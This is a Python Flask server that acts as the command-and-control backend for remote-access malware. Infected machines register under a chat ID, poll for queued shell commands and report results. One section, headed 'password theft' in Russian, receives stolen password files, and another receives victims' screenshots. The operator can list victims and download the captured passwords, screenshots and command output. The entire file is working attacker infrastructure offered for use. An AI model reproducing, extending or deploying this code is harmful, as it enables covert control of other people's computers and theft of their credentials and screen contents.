from flask import Flask, request, jsonify, send_file
from flask_cors import CORS
import json
import os
from datetime import datetime

app = Flask(__name__)
CORS(app)

clients = {}
results = {}
command_queue = {}

RESULT_FILE = "all_results.txt"

@app.route('/register/<chat_id>', methods=['POST'])
def register(chat_id):
    try:
        data = request.get_json()
        pc_name = data.get('pc_name', 'Unknown')
        clients[chat_id] = pc_name
        print(f"✅ Registered: {chat_id} -> {pc_name}")
        return jsonify({"status": "ok"})
    except:
        return jsonify({"status": "error"}), 500

@app.route('/clients', methods=['GET'])
def get_clients():
    return jsonify(clients)

@app.route('/cmd/<chat_id>', methods=['POST'])
def send_cmd(chat_id):
    try:
        cmd = request.data.decode()
        command_queue[chat_id] = cmd
        print(f"📤 Command to {chat_id}: {cmd}")
        return jsonify({"status": "sent"})
    except:
        return jsonify({"status": "error"}), 500

@app.route('/poll/<chat_id>', methods=['GET'])
def poll(chat_id):
    cmd = command_queue.pop(chat_id, None)
    if cmd:
        return cmd
    return "NO_CMD"

@app.route('/result/<chat_id>', methods=['GET'])
def add_result(chat_id):
    try:
        text = request.args.get('data', '')
        if text:
            results[chat_id] = text
            timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            pc_name = clients.get(chat_id, chat_id)
            with open(RESULT_FILE, "a", encoding="utf-8") as f:
                f.write(f"[{timestamp}] {pc_name} ({chat_id}): {text}\n")
            print(f"📥 Result from {chat_id}: {text}")
        return jsonify({"status": "ok"})
    except:
        return jsonify({"status": "error"}), 500

@app.route('/result/<chat_id>', methods=['POST'])
def get_result(chat_id):
    return results.get(chat_id, "NO_RESULT")

# === КРАЖА ПАРОЛЕЙ ===
@app.route('/upload_passwords/<chat_id>', methods=['POST'])
def upload_passwords(chat_id):
    try:
        if 'passwords' not in request.files:
            return "No file", 400
        file = request.files['passwords']
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f"passwords_{chat_id}_{timestamp}.txt"
        if not os.path.exists('passwords'):
            os.makedirs('passwords')
        file.save(os.path.join('passwords', filename))
        print(f"🔐 Passwords saved from {chat_id}")
        return "OK"
    except Exception as e:
        print(f"Error: {e}")
        return "Error", 500

@app.route('/download_passwords/<chat_id>', methods=['GET'])
def download_passwords(chat_id):
    try:
        passwords_dir = 'passwords'
        if not os.path.exists(passwords_dir):
            return "No passwords", 404
        files = [f for f in os.listdir(passwords_dir) if f.startswith(f"passwords_{chat_id}_")]
        if not files:
            return "No passwords", 404
        latest = max(files, key=lambda x: os.path.getctime(os.path.join(passwords_dir, x)))
        return send_file(os.path.join(passwords_dir, latest), mimetype='text/plain')
    except:
        return "Error", 500

# === СКРИНШОТЫ ===
@app.route('/upload/<chat_id>', methods=['POST'])
def upload_screenshot(chat_id):
    try:
        if 'screenshot' not in request.files:
            return "No file", 400
        file = request.files['screenshot']
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f"screenshot_{chat_id}_{timestamp}.png"
        if not os.path.exists('screenshots'):
            os.makedirs('screenshots')
        file.save(os.path.join('screenshots', filename))
        return jsonify({"status": "ok", "filename": filename})
    except:
        return "Error", 500

@app.route('/screenshot/<chat_id>', methods=['GET'])
def get_screenshot(chat_id):
    try:
        screenshots_dir = 'screenshots'
        if not os.path.exists(screenshots_dir):
            return "No screenshots", 404
        files = [f for f in os.listdir(screenshots_dir) if f.startswith(f"screenshot_{chat_id}_")]
        if not files:
            return "No screenshots", 404
        latest = max(files, key=lambda x: os.path.getctime(os.path.join(screenshots_dir, x)))
        return send_file(os.path.join(screenshots_dir, latest), mimetype='image/png')
    except:
        return "Error", 500

@app.route('/view-results', methods=['GET'])
def view_results():
    if not os.path.exists(RESULT_FILE):
        return "<pre>Результатов пока нет</pre>"
    with open(RESULT_FILE, "r", encoding="utf-8") as f:
        content = f.read()
    return f"<pre>{content}</pre>"

@app.route('/health', methods=['GET'])
def health():
    return "OK"

if __name__ == '__main__':
    for folder in ['screenshots', 'passwords']:
        if not os.path.exists(folder):
            os.makedirs(folder)
    app.run(host='0.0.0.0', port=5000)
